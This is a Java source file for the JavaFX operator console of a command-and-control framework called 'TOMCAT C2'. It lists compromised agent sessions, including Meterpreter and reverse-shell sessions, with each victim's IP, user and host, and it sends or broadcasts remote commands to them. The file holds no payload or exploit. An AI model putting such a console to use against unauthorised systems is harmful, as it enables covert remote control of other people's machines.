package com.tomcat.iface;

import com.tomcat.core.db.TeamDatabase;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.ListenerMode;
import com.tomcat.core.server.TomcatServer;
import com.tomcat.core.session.Session;
import com.tomcat.utils.ServerConfig;
import com.tomcat.utils.SystemHelper;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.Executors;
import javafx.application.Application;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.collections.*;
import javafx.geometry.*;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import javafx.scene.text.*;
import javafx.stage.Stage;

public class GUI extends Application {

    private static ServerConfig Config;
    private TeamDatabase Db;
    private TomcatServer Server;
    private Instant ServerStartTime;
    private final ObservableList<SessionRow> SessionRows = FXCollections.observableArrayList();
    private final ObservableList<String> LogEntries = FXCollections.observableArrayList();
    private int SelectedSessionId = -1;

    private static final String BgColor = "#0a0e14";
    private static final String NavColor = "#0d1117";
    private static final String CardColor = "#131920";
    private static final String Card2Color = "#1c2333";
    private static final String AccentColor = "#58a6ff";
    private static final String RedColor = "#f85149";
    private static final String GreenColor = "#3fb950";
    private static final String TextColor = "#f0f6fc";
    private static final String MutedColor = "#8b949e";
    private static final String BorderColor = "#21262d";

    private Label StatusLabel;
    private Label UptimeLabel;
    private Label SessionCountLabel;
    private TableView<SessionRow> SessionTable;
    private TextArea TerminalOutput;
    private TextArea LogOutput;
    private TextField TermInputField;
    private TextField CmdInputField;
    private Label SelectedAgentLabel;
    private Label ServerStatusLabel;
    private Label ServerInfoLabel;
    private TextField HostField;
    private TextField PortField;
    private Button StartBtn;
    private Button StopBtn;

    public static class SessionRow {

        private final SimpleStringProperty Id, Type, Name, Ip, Os, User, Host, Joined;

        public SessionRow(Session S) {
            Id = new SimpleStringProperty(String.valueOf(S.GetId()));
            Type = new SimpleStringProperty(S.GetSessionType().name());
            Name = new SimpleStringProperty(S.GetAgentName());
            Ip = new SimpleStringProperty(S.GetAgentIp());
            Os = new SimpleStringProperty(S.GetOs());
            User = new SimpleStringProperty(S.GetUser());
            Host = new SimpleStringProperty(S.GetHostname());
            Joined = new SimpleStringProperty(S.GetJoinedAt());
        }

        public String getId() {
            return Id.get();
        }

        public String getType() {
            return Type.get();
        }

        public String getName() {
            return Name.get();
        }

        public String getIp() {
            return Ip.get();
        }

        public String getOs() {
            return Os.get();
        }

        public String getUser() {
            return User.get();
        }

        public String getHost() {
            return Host.get();
        }

        public String getJoined() {
            return Joined.get();
        }

        public SimpleStringProperty IdProperty() {
            return Id;
        }

        public SimpleStringProperty TypeProperty() {
            return Type;
        }

        public SimpleStringProperty NameProperty() {
            return Name;
        }

        public SimpleStringProperty IpProperty() {
            return Ip;
        }

        public SimpleStringProperty OsProperty() {
            return Os;
        }

        public SimpleStringProperty UserProperty() {
            return User;
        }

        public SimpleStringProperty HostProperty() {
            return Host;
        }

        public SimpleStringProperty JoinedProperty() {
            return Joined;
        }
    }

    public static void Launch(ServerConfig Cfg) {
        Config = Cfg;
        Application.launch(GUI.class);
    }

    @Override
    public void start(Stage PrimaryStage) {
        Db = TeamDatabase.Connect(Config);
        PrimaryStage.setTitle("TOMCAT C2 Framework V2");
        PrimaryStage.setWidth(1280);
        PrimaryStage.setHeight(800);
        PrimaryStage.setMinWidth(1024);
        PrimaryStage.setMinHeight(600);

        BorderPane Root = new BorderPane();
        Root.setStyle("-fx-background-color: " + BgColor + ";");
        Root.setLeft(BuildSidebar(PrimaryStage));
        Root.setCenter(BuildMainContent());

        Scene MainScene = new Scene(Root);
        PrimaryStage.setScene(MainScene);
        PrimaryStage.setOnCloseRequest(E -> {
            if (Server != null) Server.StopServer();
            Platform.exit();
        });
        PrimaryStage.show();
        StartUptimeTimer();
    }

    private VBox BuildSidebar(Stage Stage) {
        VBox Sidebar = new VBox();
        Sidebar.setPrefWidth(200);
        Sidebar.setStyle("-fx-background-color: " + NavColor + ";");

        HBox Logo = new HBox(8);
        Logo.setPadding(new Insets(20, 16, 8, 16));
        Label Icon = StyledLabel("◉", 20, RedColor, true);
        VBox Title = new VBox(2);
        Title.getChildren()
            .addAll(StyledLabel("TOMCAT", 13, TextColor, true), StyledLabel("C2 Framework", 8, MutedColor, false));
        Logo.getChildren().addAll(Icon, Title);
        Sidebar.getChildren().add(Logo);
        Sidebar.getChildren().add(Divider());

        TabPane NavTabs = new TabPane();
        NavTabs.setTabClosingPolicy(TabPane.TabClosingPolicy.UNAVAILABLE);
        NavTabs.setStyle("-fx-background-color: " + NavColor + ";" + "-fx-tab-min-height: 40px;");

        NavTabs.getTabs()
            .addAll(
                BuildNavTab("⊞  Dashboard", BuildDashboardTab()),
                BuildNavTab("⊟  Sessions", BuildSessionsTab()),
                BuildNavTab("⊳  Terminal", BuildTerminalTab()),
                BuildNavTab("≡  Logs", BuildLogsTab()),
                BuildNavTab("⚙  Settings", BuildSettingsTab())
            );

        VBox.setVgrow(NavTabs, Priority.ALWAYS);
        Sidebar.getChildren().add(NavTabs);

        VBox Footer = new VBox(4);
        Footer.setPadding(new Insets(8, 16, 12, 16));
        Footer.setStyle(
            "-fx-border-color: " + BorderColor + " transparent transparent transparent; -fx-border-width: 1;"
        );
        Footer.getChildren()
            .addAll(
                StatusLabel = StyledLabel("● Offline", 9, RedColor, true),
                StyledLabel("Author: MatrixTM26", 7, MutedColor, false)
            );
        Sidebar.getChildren().add(Footer);
        return Sidebar;
    }

    private Tab BuildNavTab(String Name, javafx.scene.Node Content) {
        Tab T = new Tab(Name);
        T.setContent(Content);
        return T;
    }

    private BorderPane BuildMainContent() {
        BorderPane Main = new BorderPane();
        Main.setStyle("-fx-background-color: " + BgColor + ";");
        HBox TopBar = new HBox();
        TopBar.setPrefHeight(50);
        TopBar.setAlignment(Pos.CENTER_LEFT);
        TopBar.setStyle("-fx-background-color: " + CardColor + ";");
        TopBar.setPadding(new Insets(0, 16, 0, 16));

        UptimeLabel = StyledLabel("⏱ 00:00:00", 9, MutedColor, false);
        SessionCountLabel = StyledLabel("⊟ 0 Sessions", 9, AccentColor, false);

        HBox Right = new HBox(16);
        Right.setAlignment(Pos.CENTER_RIGHT);
        HBox.setHgrow(Right, Priority.ALWAYS);
        Right.getChildren().addAll(UptimeLabel, VDivider(), SessionCountLabel);
        TopBar.getChildren().addAll(StyledLabel("TOMCAT C2", 12, TextColor, true), Right);
        Main.setTop(TopBar);
        return Main;
    }

    private ScrollPane BuildDashboardTab() {
        VBox Content = new VBox(12);
        Content.setPadding(new Insets(16));
        Content.setStyle("-fx-background-color: " + BgColor + ";");

        GridPane Cards = new GridPane();
        Cards.setHgap(8);
        Cards.setVgap(8);

        Cards.add(BuildStatCard("⊟", "Total Sessions", "0", AccentColor), 0, 0);
        Cards.add(BuildStatCard("◉", "TOMCAT", "0", GreenColor), 1, 0);
        Cards.add(BuildStatCard("◎", "Meterpreter", "0", "#bc8cff"), 2, 0);
        Cards.add(BuildStatCard("◈", "Reverse Shell", "0", "#db6d28"), 3, 0);

        for (int I = 0; I < 4; I++) {
            ColumnConstraints Col = new ColumnConstraints();
            Col.setPercentWidth(25);
            Cards.getColumnConstraints().add(Col);
        }
        Content.getChildren().add(Cards);

        VBox Info = BuildCard("TOOL INFORMATION");
        TextArea InfoText = new TextArea(
            " Author  : MatrixTM26\n" +
            " Github  : MatrixTM26\n" +
            " Version : 2.0 (Java)\n\n" +
            " Navigate using the sidebar to manage your C2 operations.\n" +
            " Control your agents remotely with encrypted communications.\n\n" +
            " Features:\n" +
            "   • Multi-Agent Command & Control\n" +
            "   • Encrypted Communication (AES-256-GCM)\n" +
            "   • MTLS Support (PKCS12)\n" +
            "   • Multi-Protocol Support\n" +
            "   • Cross-Platform"
        );
        InfoText.setEditable(false);
        InfoText.setPrefHeight(200);
        ApplyTermStyle(InfoText);
        Info.getChildren().add(InfoText);
        Content.getChildren().add(Info);

        ScrollPane Scroll = new ScrollPane(Content);
        Scroll.setFitToWidth(true);
        Scroll.setStyle("-fx-background-color: " + BgColor + ";");
        return Scroll;
    }

    private VBox BuildSessionsTab() {
        VBox Content = new VBox(8);
        Content.setPadding(new Insets(12));
        Content.setStyle("-fx-background-color: " + BgColor + ";");

        HBox Toolbar = new HBox(8);
        Toolbar.setAlignment(Pos.CENTER_LEFT);
        TextField Search = new TextField();
        Search.setPromptText("🔍 Search sessions...");
        ApplyInputStyle(Search);
        Search.setPrefWidth(220);
        HBox.setHgrow(Search, Priority.ALWAYS);

        Button Refresh = StyledButton("⟳ Refresh", AccentColor, false);
        Button Execute = StyledButton("▶ Execute", GreenColor, false);
        Button Broadcast = StyledButton("⇶ Broadcast", "#bc8cff", false);
        Button Kill = StyledButton("⊘ Kill", RedColor, false);
        Refresh.setOnAction(E -> RefreshSessions());
        Execute.setOnAction(E -> OpenExecuteWindow());
        Broadcast.setOnAction(E -> OpenBroadcastWindow());
        Kill.setOnAction(E -> KillSelected());
        Toolbar.getChildren().addAll(Search, Refresh, Execute, Broadcast, Kill);
        Content.getChildren().add(Toolbar);

        SessionTable = new TableView<>(SessionRows);
        SessionTable.setStyle("-fx-background-color: " + CardColor + "; -fx-text-fill: " + TextColor + ";");
        String[] ColNames = { "ID", "Type", "Name", "IP", "OS", "User", "Host", "Joined" };
        String[] Props = { "id", "type", "name", "ip", "os", "user", "host", "joined" };
        for (int I = 0; I < ColNames.length; I++) {
            TableColumn<SessionRow, String> Col = new TableColumn<>(ColNames[I]);
            Col.setCellValueFactory(new PropertyValueFactory<>(Props[I]));
            Col.setStyle("-fx-text-fill: " + TextColor + ";");
            SessionTable.getColumns().add(Col);
        }
        SessionTable.getSelectionModel()
            .selectedItemProperty()
            .addListener((Obs, Old, New) -> {
                if (New != null) {
                    SelectedSessionId = Integer.parseInt(New.getId());
                    if (SelectedAgentLabel != null) SelectedAgentLabel.setText("● SESSION-" + SelectedSessionId);
                }
            });
        VBox.setVgrow(SessionTable, Priority.ALWAYS);
        Content.getChildren().add(SessionTable);
        return Content;
    }

    private VBox BuildTerminalTab() {
        VBox Content = new VBox(8);
        Content.setPadding(new Insets(12));
        Content.setStyle("-fx-background-color: " + BgColor + ";");

        HBox Header = new HBox(8);
        Header.setAlignment(Pos.CENTER_LEFT);
        Label SessionLbl = StyledLabel("Session ID:", 9, MutedColor, false);
        TermInputField = new TextField();
        TermInputField.setPrefWidth(80);
        ApplyInputStyle(TermInputField);
        SelectedAgentLabel = StyledLabel("○ No agent selected", 9, MutedColor, false);
        Button ClearBtn = StyledButton("Clear", CardColor, false);
        ClearBtn.setOnAction(E -> {
            if (TerminalOutput != null) TerminalOutput.clear();
        });
        HBox.setHgrow(SelectedAgentLabel, Priority.ALWAYS);
        Header.getChildren().addAll(SessionLbl, TermInputField, SelectedAgentLabel, ClearBtn);
        Content.getChildren().add(Header);

        TerminalOutput = new TextArea();
        TerminalOutput.setEditable(false);
        TerminalOutput.setPrefHeight(400);
        ApplyTermStyle(TerminalOutput);
        VBox.setVgrow(TerminalOutput, Priority.ALWAYS);
        Content.getChildren().add(TerminalOutput);

        HBox InputRow = new HBox(8);
        InputRow.setAlignment(Pos.CENTER_LEFT);
        Label Prompt = StyledLabel("❯", 11, AccentColor, true);
        CmdInputField = new TextField();
        CmdInputField.setPromptText("Enter command...");
        ApplyInputStyle(CmdInputField);
        HBox.setHgrow(CmdInputField, Priority.ALWAYS);
        Button SendBtn = StyledButton("Send", AccentColor, false);
        SendBtn.setOnAction(E -> SendTerminalCommand());
        CmdInputField.setOnAction(E -> SendTerminalCommand());
        InputRow.getChildren().addAll(Prompt, CmdInputField, SendBtn);
        Content.getChildren().add(InputRow);
        return Content;
    }

    private VBox BuildLogsTab() {
        VBox Content = new VBox(8);
        Content.setPadding(new Insets(12));
        Content.setStyle("-fx-background-color: " + BgColor + ";");

        HBox Toolbar = new HBox(8);
        Toolbar.setAlignment(Pos.CENTER_RIGHT);
        Button ExportBtn = StyledButton("Export", CardColor, false);
        Button ClearBtn = StyledButton("Clear", RedColor, false);
        ClearBtn.setOnAction(E -> {
            LogEntries.clear();
            if (LogOutput != null) LogOutput.clear();
        });
        Toolbar.getChildren().addAll(ExportBtn, ClearBtn);
        Content.getChildren().add(Toolbar);

        LogOutput = new TextArea();
        LogOutput.setEditable(false);
        ApplyTermStyle(LogOutput);
        VBox.setVgrow(LogOutput, Priority.ALWAYS);
        Content.getChildren().add(LogOutput);
        return Content;
    }

    private ScrollPane BuildSettingsTab() {
        VBox Content = new VBox(16);
        Content.setPadding(new Insets(16));
        Content.setStyle("-fx-background-color: " + BgColor + ";");

        VBox ServerCard = BuildCard("Server Configuration");
        GridPane Fields = new GridPane();
        Fields.setHgap(16);
        Fields.setVgap(8);

        HostField = new TextField(Config.GetServerHost());
        PortField = new TextField(String.valueOf(Config.GetServerPort()));
        ApplyInputStyle(HostField);
        ApplyInputStyle(PortField);

        Fields.add(StyledLabel("Host:", 9, MutedColor, false), 0, 0);
        Fields.add(HostField, 1, 0);
        Fields.add(StyledLabel("Port:", 9, MutedColor, false), 0, 1);
        Fields.add(PortField, 1, 1);
        ServerCard.getChildren().add(Fields);

        HBox Btns = new HBox(8);
        StartBtn = StyledButton("▶ START SERVER", GreenColor, false);
        StopBtn = StyledButton("◼ STOP SERVER", RedColor, false);
        StopBtn.setDisable(true);
        StartBtn.setOnAction(E -> StartServer());
        StopBtn.setOnAction(E -> StopServer());
        Btns.getChildren().addAll(StartBtn, StopBtn);
        ServerCard.getChildren().add(Btns);

        VBox StatusCard = BuildCard("Server Status");
        ServerStatusLabel = StyledLabel("● OFFLINE", 16, RedColor, true);
        ServerInfoLabel = StyledLabel("Not running", 10, MutedColor, false);
        StatusCard.getChildren().addAll(ServerStatusLabel, ServerInfoLabel);

        Content.getChildren().addAll(ServerCard, StatusCard);
        ScrollPane Scroll = new ScrollPane(Content);
        Scroll.setFitToWidth(true);
        Scroll.setStyle("-fx-background-color: " + BgColor + ";");
        return Scroll;
    }

    private void StartServer() {
        String Host = HostField.getText().trim();
        int Port;
        try {
            Port = Integer.parseInt(PortField.getText().trim());
        } catch (NumberFormatException E) {
            ShowAlert("Invalid port number");
            return;
        }
        Server = new TomcatServer(Host, Port, ListenerMode.FromString(Config.GetServerMode()), Config);
        Server.AddEventListener(this::EventHandler);
        boolean[] Result = Server.StartServer();
        if (!Result[0]) {
            ShowAlert("Failed to start server");
            return;
        }
        ServerStartTime = Instant.now();
        Thread T = new Thread(Server::AcceptConnections, "AcceptConnections");
        T.setDaemon(true);
        T.start();
        Platform.runLater(() -> {
            ServerStatusLabel.setText("● ONLINE");
            ServerStatusLabel.setTextFill(javafx.scene.paint.Color.web(GreenColor));
            ServerInfoLabel.setText(Host + ":" + Port);
            StatusLabel.setText("● Online");
            StatusLabel.setTextFill(javafx.scene.paint.Color.web(GreenColor));
            StartBtn.setDisable(true);
            StopBtn.setDisable(false);
        });
        AddLog("[+] Server started on " + Host + ":" + Port);
        AddLog("[+] Session Key: " + Server.GetKeyBase64());
    }

    private void StopServer() {
        if (Server == null) return;
        Server.StopServer();
        ServerStartTime = null;
        Platform.runLater(() -> {
            ServerStatusLabel.setText("● OFFLINE");
            ServerStatusLabel.setTextFill(javafx.scene.paint.Color.web(RedColor));
            ServerInfoLabel.setText("Not running");
            StatusLabel.setText("● Offline");
            StatusLabel.setTextFill(javafx.scene.paint.Color.web(RedColor));
            StartBtn.setDisable(false);
            StopBtn.setDisable(true);
            SessionRows.clear();
            SessionCountLabel.setText("⊟ 0 Sessions");
        });
        AddLog("[!] Server stopped");
    }

    private void RefreshSessions() {
        if (Server == null) return;
        Platform.runLater(() -> {
            SessionRows.clear();
            for (Session S : Server.GetSessions().GetAll()) SessionRows.add(new SessionRow(S));
            SessionCountLabel.setText("⊟ " + SessionRows.size() + " Session" + (SessionRows.size() != 1 ? "s" : ""));
        });
    }

    private void SendTerminalCommand() {
        if (CmdInputField == null) return;
        String SidStr = TermInputField.getText().trim();
        String Cmd = CmdInputField.getText().trim();
        if (SidStr.isEmpty() || Cmd.isEmpty()) return;
        int Sid;
        try {
            Sid = Integer.parseInt(SidStr);
        } catch (NumberFormatException E) {
            WriteTerminal("[!] Invalid session ID\n", true);
            return;
        }
        if (Server == null) {
            WriteTerminal("[!] Server not running\n", true);
            return;
        }
        WriteTerminal("❯ " + Cmd + "\n", false);
        CmdInputField.clear();
        AddLog("[>] #" + Sid + ": " + Cmd);
        final int FinalSid = Sid;
        Executors.newSingleThreadExecutor()
            .submit(() -> {
                String[] Result = Server.ExecuteCommand(FinalSid, Cmd);
                boolean Ok = Boolean.parseBoolean(Result[0]);
                Platform.runLater(() -> {
                    WriteTerminal(Result[1] + "\n\n", false);
                    AddLog((Ok ? "[+]" : "[!]") + " #" + FinalSid + ": " + (Ok ? "OK" : Result[1]));
                });
            });
    }

    private void OpenExecuteWindow() {
        if (SelectedSessionId < 0) {
            ShowAlert("Select a session first");
            return;
        }
        Stage Win = new Stage();
        Win.setTitle("Execute — SESSION-" + SelectedSessionId);
        Win.setWidth(650);
        Win.setHeight(450);
        VBox Layout = new VBox(8);
        Layout.setPadding(new Insets(12));
        Layout.setStyle("-fx-background-color: " + BgColor + ";");
        TextArea Out = new TextArea();
        Out.setEditable(false);
        ApplyTermStyle(Out);
        VBox.setVgrow(Out, Priority.ALWAYS);
        HBox Input = new HBox(8);
        TextField Entry = new TextField();
        Entry.setPromptText("Enter command...");
        ApplyInputStyle(Entry);
        HBox.setHgrow(Entry, Priority.ALWAYS);
        Button Run = StyledButton("Run", AccentColor, false);
        final int Sid = SelectedSessionId;
        Runnable Exec = () -> {
            String Cmd = Entry.getText().trim();
            if (Cmd.isEmpty()) return;
            Out.appendText("❯ " + Cmd + "\n");
            Entry.clear();
            Executors.newSingleThreadExecutor()
                .submit(() -> {
                    String[] Result = Server.ExecuteCommand(Sid, Cmd);
                    Platform.runLater(() -> Out.appendText(Result[1] + "\n\n"));
                });
        };
        Run.setOnAction(E -> Exec.run());
        Entry.setOnAction(E -> Exec.run());
        Input.getChildren().addAll(StyledLabel("❯", 11, AccentColor, true), Entry, Run);
        Layout.getChildren().addAll(Out, Input);
        Win.setScene(new Scene(Layout));
        Win.show();
        Entry.requestFocus();
    }

    private void OpenBroadcastWindow() {
        if (Server == null || !Server.IsRunning()) {
            ShowAlert("Server not running");
            return;
        }
        Stage Win = new Stage();
        Win.setTitle("Broadcast Command");
        Win.setWidth(600);
        Win.setHeight(500);
        VBox Layout = new VBox(8);
        Layout.setPadding(new Insets(12));
        Layout.setStyle("-fx-background-color: " + BgColor + ";");

        HBox TargetRow = new HBox(8);
        TargetRow.setAlignment(Pos.CENTER_LEFT);
        Label TargetLbl = StyledLabel("Target:", 9, MutedColor, false);
        TextField TargetField = new TextField();
        TargetField.setPromptText("Session IDs: 1,2,3  or  all");
        ApplyInputStyle(TargetField);
        HBox.setHgrow(TargetField, Priority.ALWAYS);
        TargetRow.getChildren().addAll(TargetLbl, TargetField);

        TextArea Out = new TextArea();
        Out.setEditable(false);
        ApplyTermStyle(Out);
        VBox.setVgrow(Out, Priority.ALWAYS);

        HBox InputRow = new HBox(8);
        InputRow.setAlignment(Pos.CENTER_LEFT);
        TextField CmdField = new TextField();
        CmdField.setPromptText("Enter command...");
        ApplyInputStyle(CmdField);
        HBox.setHgrow(CmdField, Priority.ALWAYS);
        Button RunBtn = StyledButton("⇶ Broadcast", "#bc8cff", false);

        Runnable DoBroadcast = () -> {
            String Target = TargetField.getText().trim();
            String Cmd = CmdField.getText().trim();
            if (Target.isEmpty() || Cmd.isEmpty()) return;
            Out.appendText("⟳ Broadcasting [" + Target + "]: " + Cmd + "\n");
            CmdField.clear();
            Executors.newSingleThreadExecutor()
                .submit(() -> {
                    Map<Integer, String[]> Results;
                    if (Target.equalsIgnoreCase("all")) {
                        Results = Server.BroadcastAll(Cmd);
                    } else {
                        java.util.List<Integer> Ids = new java.util.ArrayList<>();
                        for (String S : Target.split(",")) {
                            try {
                                Ids.add(Integer.parseInt(S.trim()));
                            } catch (NumberFormatException Ignored) {}
                        }
                        Results = Server.BroadcastCommand(Ids, Cmd);
                    }
                    final Map<Integer, String[]> FinalResults = Results;
                    Platform.runLater(() -> {
                        for (Map.Entry<Integer, String[]> En : FinalResults.entrySet()) {
                            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
                            Out.appendText("SESSION-" + En.getKey() + (Ok ? " ✔" : " ✘") + ":\n");
                            Out.appendText(En.getValue()[1] + "\n\n");
                            Db.SaveCommandLog(En.getKey(), "operator", Cmd, En.getValue()[1], Ok);
                        }
                    });
                });
        };
        RunBtn.setOnAction(E -> DoBroadcast.run());
        CmdField.setOnAction(E -> DoBroadcast.run());
        InputRow.getChildren().addAll(StyledLabel("❯", 11, AccentColor, true), CmdField, RunBtn);
        Layout.getChildren().addAll(TargetRow, Out, InputRow);
        Win.setScene(new Scene(Layout));
        Win.show();
        CmdField.requestFocus();
    }

    private void KillSelected() {
        if (SelectedSessionId < 0) {
            ShowAlert("Select a session first");
            return;
        }
        Alert Confirm = new Alert(Alert.AlertType.CONFIRMATION, "Terminate SESSION-" + SelectedSessionId + "?");
        Confirm.showAndWait()
            .ifPresent(R -> {
                if (R == ButtonType.OK) {
                    Server.RemoveSession(SelectedSessionId);
                    SelectedSessionId = -1;
                    RefreshSessions();
                    if (SelectedAgentLabel != null) SelectedAgentLabel.setText("○ No agent selected");
                }
            });
    }

    private void EventHandler(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case AgentConnected -> {
                AddLog(
                    "[+] [" +
                    Data.get("Type") +
                    "] SESSION-" +
                    Data.get("ID") +
                    ": " +
                    Data.get("AgentName") +
                    " (" +
                    Data.get("OS") +
                    ")"
                );
                Platform.runLater(this::RefreshSessions);
            }
            case AgentDisconnected -> {
                AddLog("[-] SESSION-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
                Platform.runLater(this::RefreshSessions);
            }
            case Error -> AddLog("[!] " + Data.get("Message"));
        }
    }

    private void AddLog(String Msg) {
        String Ts = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        String Entry = "[" + Ts + "] " + Msg;
        LogEntries.add(Entry);
        if (LogEntries.size() > Config.GetMaxLogEntries()) LogEntries.remove(0);
        Platform.runLater(() -> {
            if (LogOutput != null) {
                LogOutput.appendText(Entry + "\n");
            }
        });
    }

    private void WriteTerminal(String Text, boolean IsError) {
        if (TerminalOutput != null) TerminalOutput.appendText(Text);
    }

    private void StartUptimeTimer() {
        Thread Timer = new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException Ignored) {}
                if (ServerStartTime != null) {
                    long S = Duration.between(ServerStartTime, Instant.now()).getSeconds();
                    String Up = SystemHelper.FormatUptime(S);
                    Platform.runLater(() -> {
                        if (UptimeLabel != null) UptimeLabel.setText("⏱ " + Up);
                    });
                }
            }
        });
        Timer.setDaemon(true);
        Timer.start();
    }

    private VBox BuildStatCard(String Icon, String Title, String Value, String Hex) {
        VBox Card = new VBox(4);
        Card.setPadding(new Insets(12));
        Card.setStyle("-fx-background-color: " + CardColor + "; -fx-background-radius: 8;");
        Card.setMinHeight(70);
        HBox Row = new HBox(8);
        Row.setAlignment(Pos.CENTER_LEFT);
        Row.getChildren()
            .addAll(
                StyledLabel(Icon, 18, Hex, false),
                new VBox(2) {
                    {
                        getChildren()
                            .addAll(StyledLabel(Title, 8, MutedColor, false), StyledLabel(Value, 14, Hex, true));
                    }
                }
            );
        Card.getChildren().add(Row);
        return Card;
    }

    private VBox BuildCard(String Title) {
        VBox Card = new VBox(8);
        Card.setPadding(new Insets(16));
        Card.setStyle("-fx-background-color: " + CardColor + "; -fx-background-radius: 8;");
        Label TitleLabel = StyledLabel(Title, 11, TextColor, true);
        Separator Sep = new Separator();
        Sep.setStyle("-fx-background-color: " + BorderColor + ";");
        Card.getChildren().addAll(TitleLabel, Sep);
        return Card;
    }

    private Label StyledLabel(String Text, int Size, String Hex, boolean Bold) {
        Label L = new Label(Text);
        L.setFont(Font.font("Segoe UI", Bold ? FontWeight.BOLD : FontWeight.NORMAL, Size));
        L.setTextFill(javafx.scene.paint.Color.web(Hex));
        return L;
    }

    private Button StyledButton(String Text, String Hex, boolean Outline) {
        Button B = new Button(Text);
        B.setStyle(
            "-fx-background-color: " +
            Hex +
            ";" +
            "-fx-text-fill: " +
            (Outline ? Hex : "#ffffff") +
            ";" +
            "-fx-font-family: 'Segoe UI';" +
            "-fx-font-size: 9px;" +
            "-fx-font-weight: bold;" +
            "-fx-padding: 6 14 6 14;" +
            "-fx-background-radius: 4;" +
            "-fx-cursor: hand;"
        );
        return B;
    }

    private void ApplyInputStyle(TextField F) {
        F.setStyle(
            "-fx-background-color: " +
            Card2Color +
            ";" +
            "-fx-text-fill: " +
            TextColor +
            ";" +
            "-fx-prompt-text-fill: " +
            MutedColor +
            ";" +
            "-fx-font-family: 'Consolas';" +
            "-fx-font-size: 10px;" +
            "-fx-padding: 6 10 6 10;" +
            "-fx-background-radius: 4;"
        );
    }

    private void ApplyTermStyle(TextArea A) {
        A.setStyle(
            "-fx-background-color: #0c1018;" +
            "-fx-text-fill: " +
            GreenColor +
            ";" +
            "-fx-font-family: 'Consolas';" +
            "-fx-font-size: 10px;" +
            "-fx-padding: 8 12 8 12;"
        );
        A.setWrapText(true);
    }

    private Region VDivider() {
        Region R = new Region();
        R.setStyle("-fx-background-color: " + BorderColor + ";");
        R.setPrefWidth(1);
        R.setPrefHeight(20);
        return R;
    }

    private Separator Divider() {
        Separator S = new Separator();
        S.setPadding(new Insets(4, 16, 4, 16));
        S.setStyle("-fx-background-color: " + BorderColor + ";");
        return S;
    }

    private void ShowAlert(String Msg) {
        Alert A = new Alert(Alert.AlertType.WARNING, Msg);
        A.setHeaderText(null);
        A.showAndWait();
    }
}
